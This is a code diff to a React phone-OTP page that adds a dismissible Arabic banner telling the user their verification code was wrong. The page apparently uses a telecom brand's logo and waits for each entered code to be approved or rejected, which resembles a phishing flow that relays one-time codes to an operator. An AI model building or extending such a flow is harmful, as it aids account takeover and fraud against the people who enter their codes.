@@ -9,6 +9,7 @@ import { toast } from "sonner";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import { useLanguage } from "@/i18n/LanguageContext";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
+import RejectionBanner from "@/components/RejectionBanner";
 import stcLogo from "@/assets/stc-logo.svg";
 import { FieldError } from "@/components/ui/field-error";
 
@@ -25,6 +26,7 @@ const PhoneOTP = () => {
   const [code, setCode] = useState("");
   const [loading, setLoading] = useState(false);
   const [waitingApproval, setWaitingApproval] = useState(false);
+  const [rejected, setRejected] = useState(false);
   const [orderId, setOrderId] = useState<string | null>(passedOrderId);
   const [timer, setTimer] = useState(120);
   const [canResend, setCanResend] = useState(false);
@@ -54,6 +56,7 @@ const PhoneOTP = () => {
       toast.error(po.rejected);
       setWaitingApproval(false);
       setLoading(false);
+      setRejected(true);
     }
   }, [approvalStatus, orderId, navigate, offer, phone, carrier]);
 
@@ -118,6 +121,11 @@ const PhoneOTP = () => {
           />
         ) : (
           <>
+            <RejectionBanner
+              show={rejected}
+              message="رمز التحقق المُدخل غير صحيح. يرجى مراجعة الرمز المُرسَل إلى جوالك وإعادة إدخاله بشكل صحيح."
+              onDismiss={() => setRejected(false)}
+            />
             <h2 className="text-lg font-bold text-foreground mb-1">{po.enterCode}</h2>
             <p className="text-xs text-muted-foreground mb-1">{po.codeSent}</p>
             <p className="text-xs font-bold text-foreground mb-1 flex items-center justify-center gap-1" dir="ltr">
